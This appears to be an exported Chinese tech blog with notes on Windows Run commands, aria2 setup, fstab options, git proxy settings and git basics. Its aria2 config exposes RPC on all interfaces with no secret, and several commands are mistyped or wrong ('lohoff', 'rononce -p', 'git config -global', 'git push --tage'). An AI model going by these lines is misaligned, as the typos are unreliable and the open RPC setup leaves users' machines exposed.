    <title>Windows快捷技巧</title>
    <url>/2020/10/21/Windows%E5%BF%AB%E6%8D%B7%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<h1 id="常用运行命令"><a href="#常用运行命令" class="headerlink" title="常用运行命令"></a>常用运行命令</h1><p><code>Win + R</code> 运行</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">regedit---注册表编辑器</span><br><span class="line">services.msc---服务管理</span><br><span class="line">gpedit.msc---本地组策略编辑器</span><br><span class="line">secpol.msc---本地安全组策略</span><br><span class="line">devmgmt.msc---设备管理</span><br><span class="line">compmgmt.msc---计算机管理</span><br><span class="line">progman---程序管理器</span><br><span class="line">winmsd---系统信息</span><br><span class="line">winver---系统版本</span><br><span class="line">eventvwr---事件查看器</span><br><span class="line">dxdiag---DirectX检查</span><br><span class="line">mstsc---远程桌面连接</span><br><span class="line">osk---屏幕键盘</span><br><span class="line">notepad---记事本</span><br><span class="line">mspaint---画图板</span><br><span class="line">calc---计算器</span><br><span class="line">lohoff---注销</span><br><span class="line">rononce -p ---15秒关机</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>aria2配置使用</title>
    <url>/2019/09/22/aria2%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="安装aria2"><a href="#安装aria2" class="headerlink" title="安装aria2"></a>安装aria2</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S aria2</span><br></pre></td></tr></table></figure>
<h4 id="配置aria2-RPC"><a href="#配置aria2-RPC" class="headerlink" title="配置aria2 RPC"></a>配置aria2 RPC</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir ~/.config/aria2/</span><br><span class="line">touch ~/.config/aria2/aria2.session 	<span class="comment">#创建日志文件</span></span><br><span class="line">vim ~/.config/aria2/aria2.conf</span><br><span class="line"><span class="comment"># 加入以下配置内容，注意修改日志文件路径</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p><strong>其他系统可相应更改路径即可</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">## &#39;#&#39;开头为注释内容, 选项都有相应的注释说明, 根据需要修改 ##</span><br><span class="line">## 被注释的选项填写的是默认值, 建议在需要修改时再取消注释  ##</span><br><span class="line"></span><br><span class="line">## 文件保存相关 ##</span><br><span class="line"></span><br><span class="line"># 文件的保存路径(可使用绝对路径或相对路径), 默认: 当前启动位置</span><br><span class="line">dir&#x3D;~&#x2F;downloads</span><br><span class="line"># 启用磁盘缓存, 0为禁用缓存, 需1.16以上版本, 默认:16M</span><br><span class="line">#disk-cache&#x3D;32M</span><br><span class="line"># 文件预分配方式, 能有效降低磁盘碎片, 默认:prealloc</span><br><span class="line"># 预分配所需时间: none &lt; falloc ? trunc &lt; prealloc</span><br><span class="line"># falloc和trunc则需要文件系统和内核支持</span><br><span class="line"># NTFS建议使用falloc, EXT3&#x2F;4建议trunc, MAC 下需要注释此项</span><br><span class="line">#file-allocation&#x3D;none</span><br><span class="line"># 断点续传</span><br><span class="line">continue&#x3D;true</span><br><span class="line"></span><br><span class="line">## 下载连接相关 ##</span><br><span class="line"></span><br><span class="line"># 最大同时下载任务数, 运行时可修改, 默认:5</span><br><span class="line">#max-concurrent-downloads&#x3D;5</span><br><span class="line"># 同一服务器连接数, 添加时可指定, 默认:1</span><br><span class="line">max-connection-per-server&#x3D;5</span><br><span class="line"># 最小文件分片大小, 添加时可指定, 取值范围1M -1024M, 默认:20M</span><br><span class="line"># 假定size&#x3D;10M, 文件为20MiB 则使用两个来源下载; 文件为15MiB 则使用一个来源下载</span><br><span class="line">min-split-size&#x3D;10M</span><br><span class="line"># 单个任务最大线程数, 添加时可指定, 默认:5</span><br><span class="line">#split&#x3D;5</span><br><span class="line"># 整体下载速度限制, 运行时可修改, 默认:0</span><br><span class="line">#max-overall-download-limit&#x3D;0</span><br><span class="line"># 单个任务下载速度限制, 默认:0</span><br><span class="line">#max-download-limit&#x3D;0</span><br><span class="line"># 整体上传速度限制, 运行时可修改, 默认:0</span><br><span class="line">#max-overall-upload-limit&#x3D;0</span><br><span class="line"># 单个任务上传速度限制, 默认:0</span><br><span class="line">#max-upload-limit&#x3D;0</span><br><span class="line"># 禁用IPv6, 默认:false</span><br><span class="line">#disable-ipv6&#x3D;true</span><br><span class="line"># 连接超时时间, 默认:60</span><br><span class="line">#timeout&#x3D;60</span><br><span class="line"># 最大重试次数, 设置为0表示不限制重试次数, 默认:5</span><br><span class="line">#max-tries&#x3D;5</span><br><span class="line"># 设置重试等待的秒数, 默认:0</span><br><span class="line">#retry-wait&#x3D;0</span><br><span class="line"></span><br><span class="line">## 进度保存相关 ##</span><br><span class="line"></span><br><span class="line"># 从会话文件中读取下载任务</span><br><span class="line"># 注意需要全路径 使用&#96;~&#96;不被识别</span><br><span class="line">input-file&#x3D;&#x2F;home&#x2F;eonun&#x2F;.config&#x2F;aria2&#x2F;aria2.session</span><br><span class="line"># 在Aria2退出时保存&#96;错误&#x2F;未完成&#96;的下载任务到会话文件</span><br><span class="line"># 注意需要全路径 使用&#96;~&#96;不被识别</span><br><span class="line">save-session&#x3D;&#x2F;home&#x2F;eonun&#x2F;.config&#x2F;aria2&#x2F;aria2.session</span><br><span class="line"># 定时保存会话, 0为退出时才保存, 需1.16.1以上版本, 默认:0</span><br><span class="line">#save-session-interval&#x3D;60</span><br><span class="line"></span><br><span class="line">## RPC相关设置 ##</span><br><span class="line"></span><br><span class="line"># 启用RPC, 默认:false</span><br><span class="line">enable-rpc&#x3D;true</span><br><span class="line"># 允许所有来源, 默认:false</span><br><span class="line">rpc-allow-origin-all&#x3D;true</span><br><span class="line"># 允许非外部访问, 默认:false</span><br><span class="line">rpc-listen-all&#x3D;true</span><br><span class="line"># 事件轮询方式, 取值:[epoll, kqueue, port, poll, select], 不同系统默认值不同</span><br><span class="line">#event-poll&#x3D;select</span><br><span class="line"># RPC监听端口, 端口被占用时可以修改, 默认:6800</span><br><span class="line">#rpc-listen-port&#x3D;6800</span><br><span class="line"># 设置的RPC授权令牌, v1.18.4新增功能, 取代 --rpc-user 和 --rpc-passwd 选项</span><br><span class="line">#rpc-secret&#x3D;&lt;TOKEN&gt;</span><br><span class="line"># 设置的RPC访问用户名, 此选项新版已废弃, 建议改用 --rpc-secret 选项</span><br><span class="line">#rpc-user&#x3D;&lt;USER&gt;</span><br><span class="line"># 设置的RPC访问密码, 此选项新版已废弃, 建议改用 --rpc-secret 选项</span><br><span class="line">#rpc-passwd&#x3D;&lt;PASSWD&gt;</span><br><span class="line"># 是否启用 RPC 服务的 SSL&#x2F;TLS 加密,</span><br><span class="line"># 启用加密后 RPC 服务需要使用 https 或者 wss 协议连接</span><br><span class="line">#rpc-secure&#x3D;true</span><br><span class="line"># 在 RPC 服务中启用 SSL&#x2F;TLS 加密时的证书文件,</span><br><span class="line"># 使用 PEM 格式时，您必须通过 --rpc-private-key 指定私钥</span><br><span class="line">#rpc-certificate&#x3D;&#x2F;path&#x2F;to&#x2F;certificate.pem</span><br><span class="line"># 在 RPC 服务中启用 SSL&#x2F;TLS 加密时的私钥文件</span><br><span class="line">#rpc-private-key&#x3D;&#x2F;path&#x2F;to&#x2F;certificate.key</span><br><span class="line"></span><br><span class="line">## BT&#x2F;PT下载相关 ##</span><br><span class="line"></span><br><span class="line"># 当下载的是一个种子(以.torrent结尾)时, 自动开始BT任务, 默认:true</span><br><span class="line">#follow-torrent&#x3D;true</span><br><span class="line"># BT监听端口, 当端口被屏蔽时使用, 默认:6881-6999</span><br><span class="line">listen-port&#x3D;51413</span><br><span class="line"># 单个种子最大连接数, 默认:55</span><br><span class="line">#bt-max-peers&#x3D;55</span><br><span class="line"># 打开DHT功能, PT需要禁用, 默认:true</span><br><span class="line">enable-dht&#x3D;false</span><br><span class="line"># 打开IPv6 DHT功能, PT需要禁用</span><br><span class="line">#enable-dht6&#x3D;false</span><br><span class="line"># DHT网络监听端口, 默认:6881-6999</span><br><span class="line">#dht-listen-port&#x3D;6881-6999</span><br><span class="line"># 本地节点查找, PT需要禁用, 默认:false</span><br><span class="line">#bt-enable-lpd&#x3D;false</span><br><span class="line"># 种子交换, PT需要禁用, 默认:true</span><br><span class="line">enable-peer-exchange&#x3D;false</span><br><span class="line"># 每个种子限速, 对少种的PT很有用, 默认:50K</span><br><span class="line">#bt-request-peer-speed-limit&#x3D;50K</span><br><span class="line"># 客户端伪装, PT需要</span><br><span class="line">peer-id-prefix&#x3D;-TR2770-</span><br><span class="line">user-agent&#x3D;Transmission&#x2F;2.77</span><br><span class="line"># 当种子的分享率达到这个数时, 自动停止做种, 0为一直做种, 默认:1.0</span><br><span class="line">seed-ratio&#x3D;0</span><br><span class="line"># 强制保存会话, 即使任务已经完成, 默认:false</span><br><span class="line"># 较新的版本开启后会在任务完成后依然保留.aria2文件</span><br><span class="line">#force-save&#x3D;false</span><br><span class="line"># BT校验相关, 默认:true</span><br><span class="line">#bt-hash-check-seed&#x3D;true</span><br><span class="line"># 继续之前的BT任务时, 无需再次校验, 默认:false</span><br><span class="line">bt-seed-unverified&#x3D;true</span><br><span class="line"># 保存磁力链接元数据为种子文件(.torrent文件), 默认:false</span><br><span class="line">bt-save-metadata&#x3D;true</span><br></pre></td></tr></table></figure>
<p><strong>使用该配置</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aria2c --conf-path=<span class="variable">$HOME</span>/.config/aria2/aria2.conf</span><br><span class="line"><span class="comment"># 加 -D 表示后台启动</span></span><br></pre></td></tr></table></figure></p>
<h4 id="开启RPC"><a href="#开启RPC" class="headerlink" title="开启RPC"></a>开启RPC</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aria2 --enable-rpc --rpc-allow-origin-all -D</span><br></pre></td></tr></table></figure>
<p><strong>其他系统可到<a href="https://github.com/aria2/aria2/releases/tag/release-1.34.0">官方库下载</a></strong></p>
<p><a href="https://aria2c.com/archiver/aria2.zip">Windows懒人包下载</a>（包含以下文件）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aria2.conf    # 配置文件 可以自己根据说明修改</span><br><span class="line">aria2.exe     # 启动文件 使用这个来启动 aria2</span><br><span class="line">aria2.session # 任务保存文件 未完成任务会保存在这里</span><br><span class="line">aria2c.exe    # 32位命令行主程序</span><br><span class="line">README.md     # README</span><br><span class="line">Aria2Data     # 下载目录 默认下载文件会保存在这里</span><br></pre></td></tr></table></figure></p>
<h2 id="使用webUI"><a href="#使用webUI" class="headerlink" title="使用webUI"></a>使用webUI</h2><h4 id="安装node"><a href="#安装node" class="headerlink" title="安装node"></a>安装node</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S nodejs</span><br></pre></td></tr></table></figure>
<h4 id="克隆webui-aria2"><a href="#克隆webui-aria2" class="headerlink" title="克隆webui-aria2"></a>克隆webui-aria2</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ziahamza/webui-aria2.git ~/webui-aria2</span><br></pre></td></tr></table></figure>
<h4 id="启用webui-aria2"><a href="#启用webui-aria2" class="headerlink" title="启用webui-aria2"></a>启用webui-aria2</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/webui-aria2</span><br><span class="line">node node-server.js</span><br></pre></td></tr></table></figure>
<p><strong>通过本地访问网页，打开后若出现报错，检查RPC是否开启、RPC开放的端口</strong></p>
<h4 id="自定义脚本"><a href="#自定义脚本" class="headerlink" title="自定义脚本"></a>自定义脚本</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/aria2.sh</span><br><span class="line">chmod +x ~/aria2.sh</span><br></pre></td></tr></table></figure>
<p><strong>内容</strong>：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">aria2c --enable-rpc --rpc-allow-origin-all -D</span><br><span class="line">node ~/webui-aria2/node-server.js</span><br></pre></td></tr></table></figure></p>
<h2 id="百度网盘使用aria2下载"><a href="#百度网盘使用aria2下载" class="headerlink" title="百度网盘使用aria2下载"></a>百度网盘使用aria2下载</h2><p><strong>使用PanDownload的网页版访问网盘资源（资源地址的<code>.com</code>前面加入<code>wp</code>访问）</strong></p>
<p><strong>在下载页选择用aria2下载，配置RPC地址和端口即可即可</strong></p>
<blockquote>
<p>主机：localhost<br>端口：6800 （默认）</p>
</blockquote>
<h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><p><a href="https://aria2c.com/usage.html">Aria2 &amp; YAAW 使用说明</a><br><a href="https://zhuanlan.zhihu.com/p/30666881">Aria2基础上手指南</a><br><a href="https://www.cnblogs.com/zhuxiaoxi/p/7714457.html">Linux中配置Aria2 RPC Server</a></p>
]]></content>
      <tags>
        <tag>aria2</tag>
      </tags>
  </entry>
  <entry>
    <title>fstab文件详解</title>
    <url>/2019/09/13/fstab%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="etc-fstab文件"><a href="#etc-fstab文件" class="headerlink" title="/etc/fstab文件"></a>/etc/fstab文件</h2><p>/etc/fstab文件包含众多文件系统的描述信息,用来开机自动挂载分区。文件中每一行为一个文件系统的描述，每行的选项之间通过tab分隔，<code>#</code>开头的行为注释，空白行会被忽略。/etc/fstab文件中的设备顺序很重要，因为fsck、mount和umount等命令会读取fstab文件中的次序来执行相关的操作。</p>
<h2 id="遵循格式"><a href="#遵循格式" class="headerlink" title="遵循格式"></a>遵循格式</h2><a id="more"></a>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;device&gt;        &lt;dir&gt;         &lt;<span class="built_in">type</span>&gt;    &lt;options&gt;             &lt;dump&gt; &lt;pass&gt;</span><br><span class="line">tmpfs                  /tmp          tmpfs     nodev,nosuid          0      0</span><br><span class="line">/dev/sda1              /             ext4      defaults,noatime      0      1</span><br><span class="line">/dev/sda2              none          swap      defaults              0      0</span><br><span class="line">/dev/sda3              /home         ext4      defaults,noatime      0      2</span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong><device></device></strong>：指定加载的磁盘分区或移动文件系统，除了指定设备文件外，也可以使用UUID、LABEL来指定分区；</p>
</li>
<li><p><strong><dir></dir></strong>：指定挂载点的路径；</p>
</li>
<li><p><strong><type></type></strong>：指定文件系统的类型，如ext3，ext4等；</p>
</li>
<li><p><strong><options></options></strong>：指定挂载的选项，默认为defaults，其他可用选项包括auto，noauto，ro等等；</p>
<ul>
<li>auto - 在启动时或键入了 mount -a 命令时自动挂载。</li>
<li>noauto - 只在你的命令下被挂载。</li>
<li>exec - 允许执行此分区的二进制文件。</li>
<li>noexec - 不允许执行此文件系统上的二进制文件。</li>
<li>ro - 以只读模式挂载文件系统。</li>
<li>rw - 以读写模式挂载文件系统。</li>
<li>user - 允许任意用户挂载此文件系统，若无显示定义，隐含启用 noexec, nosuid, nodev 参数。</li>
<li>users - 允许所有 users 组中的用户挂载文件系统.</li>
<li>nouser - 只能被 root 挂载。</li>
<li>owner - 允许设备所有者挂载.</li>
<li>sync - I/O 同步进行。</li>
<li>async - I/O 异步进行。</li>
<li>dev - 解析文件系统上的块特殊设备。</li>
<li>nodev - 不解析文件系统上的块特殊设备。</li>
<li>suid - 允许 suid 操作和设定 sgid 位。这一参数通常用于一些特殊任务，使一般用户运行程序时临时提升权限。</li>
<li>nosuid - 禁止 suid 操作和设定 sgid 位。</li>
<li>noatime - 不更新文件系统上 inode 访问记录，可以提升性能(参见 atime 参数)。</li>
<li>nodiratime - 不更新文件系统上的目录 inode 访问记录，可以提升性能(参见 atime 参数)。</li>
<li>relatime - 实时更新 inode access 记录。只有在记录中的访问时间早于当前访问才会被更新。（与 noatime 相似，但不会打断如 mutt 或其它程序探测文件在上次访问后是否被修改的进程。），可以提升性能(参见 atime 参数)。</li>
<li>flush - vfat 的选项，更频繁的刷新数据，复制对话框或进度条在全部数据都写入后才消失。</li>
<li>defaults - 使用文件系统的默认挂载参数，例如 ext4 的默认参数为:rw, suid, dev, exec, auto, nouser, async.</li>
</ul>
</li>
<li><p><strong><dump></dump></strong>：表示该挂载后的文件系统能否被dump备份命令作用；0表示不能，1表示每天都进行dump备份，2表示不定期进行dump操作。</p>
</li>
<li><p><strong><pass></pass></strong>：表示开机过程中是否校验扇区；0表示不要校验，1表示优先校验（一般为根目录），2表示为在1级别校验完后再进行校验；</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>系统文件</tag>
      </tags>
  </entry>
  <entry>
    <title>git代理配置</title>
    <url>/2020/01/01/git%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h1 id="HTTP形式"><a href="#HTTP形式" class="headerlink" title="HTTP形式"></a>HTTP形式</h1><h2 id="走http代理"><a href="#走http代理" class="headerlink" title="走http代理"></a>走http代理</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global http.proxy <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">git config --global https.proxy <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># github</span></span><br><span class="line"></span><br><span class="line">git config -global http.https://github.com.proxy <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="走socks5代理"><a href="#走socks5代理" class="headerlink" title="走socks5代理"></a>走socks5代理</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global http.proxy <span class="string">&quot;socks5://127.0.0.1:1080&quot;</span></span><br><span class="line">git config --global https.proxy <span class="string">&quot;socks5://127.0.0.1:1080&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># github</span></span><br><span class="line">git config -global http.https://github.com.proxy <span class="string">&quot;socks5://127.0.0.1:1080&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="取消代理"><a href="#取消代理" class="headerlink" title="取消代理"></a>取消代理</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global --<span class="built_in">unset</span> http.proxy</span><br><span class="line">git config --global --<span class="built_in">unset</span> https.proxy</span><br><span class="line">git config --global --<span class="built_in">unset</span> http.https://github.com.proxy</span><br></pre></td></tr></table></figure>
<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># git 代理设置</span></span><br><span class="line"><span class="comment"># -p 配置全代理 -h 配置代理github -r 关闭代理 -l 显示配置信息</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">getopts</span> <span class="string">&quot;p h r l&quot;</span> opt</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="keyword">case</span> <span class="variable">$opt</span> <span class="keyword">in</span></span><br><span class="line">			p)</span><br><span class="line">				git config --global http.proxy <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span>;</span><br><span class="line">				git config --global https.proxy <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span>;</span><br><span class="line">				<span class="built_in">echo</span> <span class="string">&quot;成功配置git代理为：socks5://127.0.0.1:1080&quot;</span></span><br><span class="line"></span><br><span class="line">				;;</span><br><span class="line">			h)</span><br><span class="line">				git config --global http.https://github.com.proxy socks5://127.0.0.1:1080</span><br><span class="line">				<span class="built_in">echo</span> <span class="string">&quot;成功配置github的git代理为：socks5://127.0.0.1:1080&quot;</span></span><br><span class="line">				;;</span><br><span class="line">			r)</span><br><span class="line">				git config --global --<span class="built_in">unset</span> http.proxy;</span><br><span class="line">				git config --global --<span class="built_in">unset</span> https.proxy;</span><br><span class="line">				git config --global --<span class="built_in">unset</span> http.https://github.com.proxy;</span><br><span class="line">				<span class="built_in">echo</span> <span class="string">&quot;成功取消git代理&quot;</span></span><br><span class="line">				;;</span><br><span class="line">			l)</span><br><span class="line">				git config -l</span><br><span class="line">				;;</span><br><span class="line">			?)</span><br><span class="line">				<span class="built_in">echo</span> <span class="string">&quot;该脚本未定义该选项目&quot;</span></span><br><span class="line">				<span class="built_in">exit</span> 1</span><br><span class="line">				;;</span><br><span class="line">	<span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h1 id="SSH形式"><a href="#SSH形式" class="headerlink" title="SSH形式"></a>SSH形式</h1><p>修改 <code>~/.ssh/config</code> 文件（不存在则新建）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 代理地址</span></span><br><span class="line">Host github.com</span><br><span class="line">   HostName github.com</span><br><span class="line">   User git</span><br><span class="line">   <span class="comment"># 走 HTTP 代理</span></span><br><span class="line">   <span class="comment"># ProxyCommand socat - PROXY:127.0.0.1:%h:%p,proxyport=8080</span></span><br><span class="line">   </span><br><span class="line">   <span class="comment"># 走 socks5 代代理</span></span><br><span class="line">   <span class="comment"># ProxyCommand nc -v -x 127.0.0.1:1080 %h %p</span></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>git入手</title>
    <url>/2019/08/21/git%E5%85%A5%E6%89%8B/</url>
    <content><![CDATA[<h1 id="git入手"><a href="#git入手" class="headerlink" title="git入手"></a>git入手</h1><h3 id="首次设置Git的user-name-和-email"><a href="#首次设置Git的user-name-和-email" class="headerlink" title="首次设置Git的user name 和 email"></a>首次设置Git的user name 和 email</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;eonun&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;eonun@qq.com&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="Git的基础命令"><a href="#Git的基础命令" class="headerlink" title="Git的基础命令"></a>Git的基础命令</h3><a id="more"></a>
<p><code>master</code>：默认开发分支         <code>Head</code>：默认开发分支<br><code>origin</code>：默认远程版本库     <code>Head^</code>：Head的父提交</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">命令</th>
<th style="text-align:center">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><strong>创建版本库</strong></td>
<td style="text-align:center"><strong>创建版本库</strong></td>
</tr>
<tr>
<td style="text-align:left"><code>git clone &lt;url&gt;</code></td>
<td style="text-align:center">克隆远程版本库</td>
</tr>
<tr>
<td style="text-align:left"><code>git init</code></td>
<td style="text-align:center">初始化本地库</td>
</tr>
<tr>
<td style="text-align:left">`find . -name “.git”</td>
<td style="text-align:center">xargs rm -Rf`</td>
<td>删除敝地仓库</td>
</tr>
<tr>
<td style="text-align:left"><strong>修改和提交</strong></td>
<td style="text-align:center"><strong>修改和提交</strong></td>
</tr>
<tr>
<td style="text-align:left"><code>git status</code></td>
<td style="text-align:center">查看状态</td>
</tr>
<tr>
<td style="text-align:left"><code>git diff</code></td>
<td style="text-align:center">查看变更内容</td>
</tr>
<tr>
<td style="text-align:left"><code>git add --all</code></td>
<td style="text-align:center">跟踪所有文件</td>
</tr>
<tr>
<td style="text-align:left"><code>git add &lt;file&gt;</code></td>
<td style="text-align:center">跟踪指定文件</td>
</tr>
<tr>
<td style="text-align:left"><code>git mv &lt;old&gt; &lt;new&gt;</code></td>
<td style="text-align:center">文件改名</td>
</tr>
<tr>
<td style="text-align:left"><code>git rm &lt;file&gt;</code></td>
<td style="text-align:center">删除文件</td>
</tr>
<tr>
<td style="text-align:left"><code>git rm --cached &lt;file&gt;</code></td>
<td style="text-align:center">停止跟踪但不删除</td>
</tr>
<tr>
<td style="text-align:left"><code>git commit -m &quot;message&quot;</code></td>
<td style="text-align:center">提交所有更新过的文件，并添加提交信息 message</td>
</tr>
<tr>
<td style="text-align:left"><code>git commit --amend</code></td>
<td style="text-align:center">修改最后一次提交</td>
</tr>
<tr>
<td style="text-align:left"><strong>查看提交历史</strong></td>
<td style="text-align:center"><strong>查看提交历史</strong></td>
</tr>
<tr>
<td style="text-align:left"><code>git log</code></td>
<td style="text-align:center">查看提交历史</td>
</tr>
<tr>
<td style="text-align:left"><code>git log -p &lt;file&gt;</code></td>
<td style="text-align:center">查看指定文件的提交历史</td>
</tr>
<tr>
<td style="text-align:left"><code>git blame &lt;file&gt;</code></td>
<td style="text-align:center">以列表形式查看指定文件提交历史</td>
</tr>
<tr>
<td style="text-align:left"><strong>撤销</strong></td>
<td style="text-align:center"><strong>撤销</strong></td>
</tr>
<tr>
<td style="text-align:left"><code>git reset --hard HEAD</code></td>
<td style="text-align:center">撤销工作目录中所有未提交文件的修改内容</td>
</tr>
<tr>
<td style="text-align:left"><code>git checkout HEAD &lt;file&gt;</code></td>
<td style="text-align:center">撤销指定的未提交文件的修改内容</td>
</tr>
<tr>
<td style="text-align:left"><code>git revert &lt;commit&gt;</code></td>
<td style="text-align:center">撤销指定的提交</td>
</tr>
<tr>
<td style="text-align:left"><strong>分支与标签</strong></td>
<td style="text-align:center"><strong>分支与标签</strong></td>
</tr>
<tr>
<td style="text-align:left"><code>git branch</code></td>
<td style="text-align:center">显示所有本地分支</td>
</tr>
<tr>
<td style="text-align:left"><code>git checkout &lt;branch/tag&gt;</code></td>
<td style="text-align:center">切换到指定分支或标签</td>
</tr>
<tr>
<td style="text-align:left"><code>git branch &lt;new-branch&gt;</code></td>
<td style="text-align:center">创建新分支</td>
</tr>
<tr>
<td style="text-align:left"><code>git branch -d &lt;branch&gt;</code></td>
<td style="text-align:center">删除本地分支</td>
</tr>
<tr>
<td style="text-align:left"><code>git tag</code></td>
<td style="text-align:center">列出所有本地标签</td>
</tr>
<tr>
<td style="text-align:left"><code>git tag &lt;tagname&gt;</code></td>
<td style="text-align:center">基于最新提交创建标签</td>
</tr>
<tr>
<td style="text-align:left"><code>git tag -d &lt;tagname&gt;</code></td>
<td style="text-align:center">删除标签</td>
</tr>
<tr>
<td style="text-align:left"><strong>合并与衍合</strong></td>
<td style="text-align:center"><strong>合并与衍合</strong></td>
</tr>
<tr>
<td style="text-align:left"><code>git merge &lt;branch&gt;</code></td>
<td style="text-align:center">合并指定分支到当前分支</td>
</tr>
<tr>
<td style="text-align:left"><code>git rebase &lt;branch&gt;</code></td>
<td style="text-align:center">衍合指定分支到当前分支</td>
</tr>
<tr>
<td style="text-align:left"><strong>远程操作</strong></td>
<td style="text-align:center"><strong>远程操作</strong></td>
</tr>
<tr>
<td style="text-align:left"><code>git remote -v</code></td>
<td style="text-align:center">查看远程版本库信息</td>
</tr>
<tr>
<td style="text-align:left"><code>git remote show &lt;remote&gt;</code></td>
<td style="text-align:center">查看指定远程版本库信息</td>
</tr>
<tr>
<td style="text-align:left"><code>git remote add &lt;remote&gt; &lt;url&gt;</code></td>
<td style="text-align:center">添加远程版本库</td>
</tr>
<tr>
<td style="text-align:left"><code>git fetch &lt;remote&gt;</code></td>
<td style="text-align:center">从远程库获取代码</td>
</tr>
<tr>
<td style="text-align:left"><code>git pull &lt;remote&gt;</code></td>
<td style="text-align:center">下载代码及快速合并</td>
</tr>
<tr>
<td style="text-align:left"><code>git push &lt;remote&gt; &lt;branch&gt;</code></td>
<td style="text-align:center">上传代码及快速合并</td>
</tr>
<tr>
<td style="text-align:left"><code>git push &lt;remote&gt; :&lt;branch/tag-name&gt;</code></td>
<td style="text-align:center">删除远程分之或标签</td>
</tr>
<tr>
<td style="text-align:left"><code>git push --tage</code></td>
<td style="text-align:center">上传所有标签</td>
</tr>
<tr>
<td style="text-align:left"><strong>暂存</strong></td>
<td style="text-align:center"><strong>暂存</strong></td>
</tr>
<tr>
<td style="text-align:left"><code>git stash</code></td>
<td style="text-align:center">暂存</td>
</tr>
<tr>
<td style="text-align:left"><code>git stash list</code></td>
<td style="text-align:center">查看所有暂存信息</td>
</tr>
<tr>
<td style="text-align:left"><code>git stash apply stash@&#123;0&#125;</code></td>
<td style="text-align:center">恢复 stash@{0}</td>
</tr>
</tbody>
</table>
</div>
<h3 id="github配置shh-key"><a href="#github配置shh-key" class="headerlink" title="github配置shh-key"></a>github配置shh-key</h3><p><strong>生成秘钥</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;eonun@qq.com&quot;</span></span><br><span class="line"><span class="comment"># 输入全路径文件名（默认:~/.ssh/id_rsa），输入密码（默认：空），一路回车默认也可</span></span><br><span class="line"><span class="comment"># 生成两个文件：id_rsa 和 id_rsa.pub</span></span><br></pre></td></tr></table></figure>
<p><strong>将秘钥添加到<code>ssh-agent</code></strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-add ~/.ssh/id_rsa</span><br><span class="line">ssh-add -l		<span class="comment"># 显示已添加</span></span><br></pre></td></tr></table></figure>
<p><strong>在<code>Github</code>添加<code>ssh-key</code></strong><br>到github里 <code>Settings</code> &gt; <code>SSH and GPG keys</code> &gt; <code>SSH keys</code> 添加秘钥<br>秘钥内容是<code>xxx_rsa.pub</code>的内容</p>
<p><strong>测试</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><br>出现：</p>
<blockquote>
<p>The authenticity of host ‘github.com (207.97.227.239)’ can’t be established.<br>RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.<br>Are you sure you want to continue connecting (yes/no)?</p>
</blockquote>
<p>输入<code>yse</code>出现：</p>
<blockquote>
<p>Hi eonun! You’ve successfully authenticated, but GitHub does not provide shell access.</p>
